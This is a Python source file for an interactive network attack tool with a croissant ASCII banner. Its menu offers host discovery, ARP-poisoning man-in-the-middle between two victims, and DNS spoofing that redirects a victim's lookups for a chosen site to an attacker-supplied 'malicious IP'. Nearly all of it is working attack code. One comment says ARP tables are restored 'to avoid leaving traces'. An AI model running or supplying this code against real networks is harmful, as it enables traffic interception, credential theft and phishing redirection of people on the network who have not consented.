from datetime import datetime
import sys
import scapy.all as scapy
from scapy.layers.l2 import Ether, ARP
import os
import time
import netifaces
import nmap
import netfilterqueue
import threading

# Global variables
interface = "wlp2s0"
ip_range = "192.168.56.0/24"
first_run = 1
victim_ip = ""
website_spoofed = ""
malicious_ip = ""


# ==================================#
# ========== Main Method ===========#
# ==================================#
def main():
    global first_run
    if (first_run):
        print("\n\n"
              "                     withGreatCroissants                               \n"
              "                  Comes Great Satisfaction.                             \n"
              "               Withgrea            tcroissants                          \n"
              "             comesgre                ats  `atisfac                      \n"
              "           .tion`                    /wi     `thgre                     \n"
              "         `atCr-                        oi-       /SSa                   \n"
              "        :nts:                          `co        mESg`                 \n"
              "       +MMs                             yM`      .NshMN/                \n"
              "      oMM+                              +M:     `dd  +MMo               \n"
              "     /MMo                               +M:    `hm`   /MM/              \n"
              "    `NMh                              `.yMmdyo/dMo-    dMd              \n"
              "    oMM-                         `/sdNMMMNooymMNhmMMh+:mMy              \n"
              "    dMm                        /hMMmy+-.`         '+hNNms`              \n"
              "    NMh     `.-:////:-.      +NMNo.                                     \n"
              "    NMy-+ydNdhsoo+oosyhdmhs/dMN+                                        \n"
              "    dMMMh/.              hMMMy`             _                     _     \n"
              "    `+NMs               `MM+`              (_)                   | |    \n"
              "      yMN`              -MM/  _ _ _ __  _ _ _  _ _ _ _ | |_   \n"
              "      .NMy     `:+yhhhhmmMM: / _| '/ _ \| / _/ _|/ _` | ' \| __|  \n"
              "       :MMs .odds/.    sMM: | (_| | | () | \__ \__ \ (| | | | | |   \n"
              "        -dMNMMo`       -MM+  \__||  \__/||_/_/\_,|| ||\__|  \n"
              "          :o/dMNs-      sMN.                                            \n"
              "              :ymMNy/.  `MMo                                            \n"
              "                 -odMMNhhMM:                                            \n"
              "                    `:+oo+.                                             \n"
              )  # cool ASCI art
    first_run = 0

    gws = netifaces.gateways()
    print(gws['default'][netifaces.AF_INET])
    try:
        while (1):
            print("\n-Possible actions: \n"
                  "[1] Discover\n"
                  "[2] Man in the middle \n"
                  "[3] Dns Spoofing")
            action = raw_input("Select an action: ")
            if (action == "1"):
                discover_network()
            elif (action == "2"):
                mitm()
            elif (action == "3"):
                dns()
            else:
                print("Not an available option, please select 1, 2 or 3.")

    except KeyboardInterrupt:
        print("\n-User reqested shutdown")
        print("-Shutting down...")
        sys.exit(1)


# ==================================#
# ========= ARP Poisoning ==========#
# ==================================#
def mitm():
    global interface

    try:
        interface_temp = raw_input("-Enter interface (leave blank for " + interface + "): ")
        if (len(interface_temp) > 0):
            interface = interface_temp
        print("interface is: " + interface)
        victim1_ip = raw_input("-Enter IP address of Victim 1: ")
        victim2_ip = raw_input("-Enter IP address of Victim 2: ")
    except KeyboardInterrupt:
        print("\n-Exiting mitm.")
        main()  # go back to main routine
    print("\n-Enabling IP forwarding...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    mitm_attack(victim1_ip, victim2_ip)


# retreive physical MAC address from IP address #
def get_mac(IP):
    global interface
    scapy.conf.verb = 0
    ans, unans = scapy.srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


# reset ARP tables of victims, to avoid leaving traces
def reset_arp(victim1_ip, victim2_ip):
    print("\n-Restoring victims' ARP tables...")
    victim1_mac = get_mac(victim1_ip)
    victim2_mac = get_mac(victim2_ip)

    scapy.send(ARP(op=2, pdst=victim2_ip, psrc=victim1_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim1_mac),
         count=8)  # send 8 to make sure
    scapy.send(ARP(op=2, pdst=victim1_ip, psrc=victim2_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victim2_mac),
         count=8)  # send 8 to make sure

    print("-Disabling IP forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


# key method, sends out spoofing packets
def spoof(v2_mac, v1_mac, victim2_ip, victim1_ip):
    global interface
    print(".")
    mac_attacker = ""
    with open("/sys/class/net/" + interface + "/address") as temp:
        mac_attacker = temp.readlines()

    # construct arp packet for victim1
    arp1 = Ether() / ARP()
    arp1[Ether].src = mac_attacker
    arp1[ARP].hwsrc = mac_attacker
    arp1[ARP].psrc = victim2_ip
    arp1[ARP].hwdst = v1_mac
    arp1[ARP].pdst = victim1_ip
    scapy.sendp(arp1, iface=interface)

    arp2 = Ether() / ARP()
    arp2[Ether].src = mac_attacker
    arp2[ARP].hwsrc = mac_attacker
    arp2[ARP].psrc = victim1_ip
    arp2[ARP].hwdst = v2_mac
    arp2[ARP].pdst = victim2_ip
    scapy.sendp(arp2, iface=interface)


#    send(ARP(op=2, pdst=victim1_ip, psrc=victim2_ip, hwdst=v1_mac))
#    send(ARP(op=2, pdst=victim2_ip, psrc=victim1_ip, hwdst=v2_mac))


def mitm_attack(victim1_ip, victim2_ip):
    try:
        victim1_mac = get_mac(victim1_ip)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("!- Unable to find MAC address of Victim 1")
        print("!- Exiting mitm")
        main()
    try:
        victim2_mac = get_mac(victim2_ip)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("!- Unable to find MAC address of Victim 2")
        print("!- Exiting mitm")
        main()
    print("-Poisoning victims' ARP tables...")
    while 1:
        print("."),
        try:
            spoof(victim2_mac, victim1_mac, victim2_ip, victim1_ip)
            time.sleep(2)
        except KeyboardInterrupt:
            print("-Ending mitm attack...")
            reset_arp(victim1_ip, victim2_ip)
            print("-Done.\n-Exiting mitm...")
            break
    main()

def mitm_attack_for_dns(victim1_ip, victim2_ip):
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    global interruptEvent

    interruptEvent = threading.Event()
    try:
        victim1_mac = get_mac(victim1_ip)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("!- Unable to find MAC address of Victim 1")
        print("!- Exiting mitm")
        main()
    try:
        victim2_mac = get_mac(victim2_ip)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("!- Unable to find MAC address of Victim 2")
        print("!- Exiting mitm")
        main()
    print("-Poisoning victims' ARP tables...")
    while not interruptEvent.isSet():
        spoof(victim2_mac, victim1_mac, victim2_ip, victim1_ip)
        time.sleep(2)
    print("-Ending mitm attack...")
    reset_arp(victim1_ip, victim2_ip)
    print("-Done.\n-Exiting mitm...")
      


# ==================================#
# ========= Discover Network =======#
# ==================================#


def discover_network():
    gws = netifaces.gateways()
    print(gws['default'][netifaces.AF_INET])

    nm = nmap.PortScanner()
    print("-Scanning IPs...")
    nm.scan(hosts=netifaces.gateways()['default'][netifaces.AF_INET][0] + "/24", arguments="-sP")
    for host in nm.all_hosts():
        print('Host : %s (%s)' % (host, nm[host].hostname()))
        print('State : %s' % nm[host].state())


# Discovering Network
def discover_network2():
    global interface
    global ip_range

    x = netifaces.interfaces()
    print("Interfaces, with IP and Mac respectively")

    for i in x:
        if i != 'lo':
            print(i)
            print("ipaddr: " + netifaces.ifaddresses(i)[netifaces.AF_INET][0]['addr'] + "\t\t mac: " + str(
                netifaces.ifaddresses(i)[netifaces.AF_LINK][0]['addr']))
            i += i
        else:
            continue

    try:
        temp_interface = raw_input(">Enter desired interface (Leave blank to use %s): " % interface)  # get interface
        if (len(temp_interface) > 0):
            interface = temp_interface

        temp_ip_range = raw_input(
            ">Enter Range of IPs to scan for (leave blank for %s): " % ip_range)  # get IP or IP range
        if (len(temp_ip_range) > 0):
            ip_range = temp_ip_range
    except KeyboardInterrupt:
        print("\n -Exiting network discovery")
        main()
    print("\n -Scanning...")  # initiate scanning
    start_time = datetime.now()  # start clock for time duration...

    scapy.conf.verb = 0  # start scanning
    ans, unans = scapy.srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range), timeout=2, iface=interface, inter=0.1)
    # now print the results
    print("MAC \t - \t IP\n")
    for snd, rcv in ans:
        print(rcv.sprintf(r"%Ether.src% - %ARP.psrc%"))  # display the obtained results
    stop_time = datetime.now()  # stop clock to calculate total duration
    total_time = stop_time - start_time  # compute total duration
    print("\n-Scan Complete.")
    print("-Scan duration: %s" % (total_time))  # Display scan duration


# =================================#
# ======== Dns ====================#
# =================================#
def craft_packets(packet):
    global victim_ip
    global malicious_ip
    global website_spoofed
    pkt = scapy.IP(packet.get_payload())
    if (pkt.haslayer(scapy.DNSRR)):
        print("Got a DNS packet ! source ip : " + str(pkt.src))
        qname = pkt[scapy.DNSQR].qname
        print(pkt.dst + "......" + victim_ip)
        if pkt.dst == victim_ip:
            print("success")
            print(victim_ip)
            if website_spoofed in qname:
                dns_rsp = scapy.DNSRR(rrname=qname, rdata=malicious_ip)
                pkt[scapy.DNS].an = dns_rsp
                pkt[scapy.DNS].ancount = 1

                # delete checking means
                del pkt[scapy.IP].len
                del pkt[scapy.IP].chksum
                del pkt[scapy.UDP].len
                del pkt[scapy.UDP].chksum

                packet.set_payload(str(pkt))
    packet.accept()


def dns():
    global victim_ip
    global malicious_ip
    global website_spoofed
    global interruptEvent

    gws = netifaces.gateways()
    print("-Dns spoofing starting...")
    malicious_ip = raw_input(">Enter malicious IP: ")
    victim_ip = raw_input(">Enter victim IP: ")
    website_spoofed = raw_input("Enter website name (e.g. google.com): ")
    print("string ip: "+ str(gws['default'][netifaces.AF_INET][0]))
    victim2_ip = str(gws['default'][netifaces.AF_INET][0])
    
    interruptEvent = threading.Event()
    t1 = threading.Thread(target=mitm_attack_for_dns,args=(victim_ip, victim2_ip))
    t1.start()

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, craft_packets)
    
    try:
        queue.run()
    except KeyboardInterrupt:
        interruptEvent.set() 
        t1.join()
    main()
main()